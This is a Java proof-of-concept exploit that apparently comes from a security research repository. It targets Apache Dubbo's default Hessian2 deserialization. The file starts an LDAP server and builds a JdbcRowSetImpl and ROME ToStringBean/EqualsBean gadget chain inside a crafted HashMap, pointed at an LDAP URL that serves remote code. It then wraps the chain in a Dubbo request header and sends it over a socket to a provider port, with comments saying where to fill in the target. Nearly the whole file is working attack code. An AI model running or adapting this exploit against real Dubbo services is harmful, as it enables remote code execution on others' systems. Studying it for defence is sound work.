package com.threedr3am.bug.dubbo;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import com.threedr3am.bug.server.LdapServer;
import com.threedr3am.bug.utils.Reflections;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;

/**
 * dubbo 默认配置，即hessian2反序列化，都可RCE
 * @author threedr3am
 */
public class JdbcRowSetImplPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws Exception {
    JdbcRowSetImpl rs = new JdbcRowSetImpl();
    //todo 此处填写ldap url
    rs.setDataSourceName("ldap://127.0.0.1:43658/Calc");
    rs.setMatchColumn("foo");
    Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);

    ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
    EqualsBean root = new EqualsBean(ToStringBean.class, item);

    HashMap s = new HashMap<>();
    Reflections.setFieldValue(s, "size", 2);
    Class<?> nodeC;
    try {
      nodeC = Class.forName("java.util.HashMap$Node");
    }
    catch ( ClassNotFoundException e ) {
      nodeC = Class.forName("java.util.HashMap$Entry");
    }
    Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);

    Object tbl = Array.newInstance(nodeC, 2);
    Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
    Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
    Reflections.setFieldValue(s, "table", tbl);

    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

    // header.
    byte[] header = new byte[16];
    // set magic number.
    Bytes.short2bytes((short) 0xdabb, header);
    // set request and serialization flag.
    header[2] = (byte) ((byte) 0x80 | 2);

    // set request id.
    Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

    ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
    Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

    out.writeUTF("2.0.2");
    //todo 此处填写注册中心获取到的service全限定名、版本号、方法名
    out.writeUTF("com.threedr3am.learn.server.boot.DemoService");
    out.writeUTF("1.0");
    out.writeUTF("hello");
    //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
    out.writeUTF("Ljava/util/Map;");
    out.writeObject(s);
    out.writeObject(new HashMap());

    out.flushBuffer();
    if (out instanceof Cleanable) {
      ((Cleanable) out).cleanup();
    }

    Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
    byteArrayOutputStream.write(header);
    byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

    byte[] bytes = byteArrayOutputStream.toByteArray();

    //todo 此处填写被攻击的dubbo服务提供者地址和端口
    Socket socket = new Socket("127.0.0.1", 20880);
    OutputStream outputStream = socket.getOutputStream();
    outputStream.write(bytes);
    outputStream.flush();
    outputStream.close();
  }
}
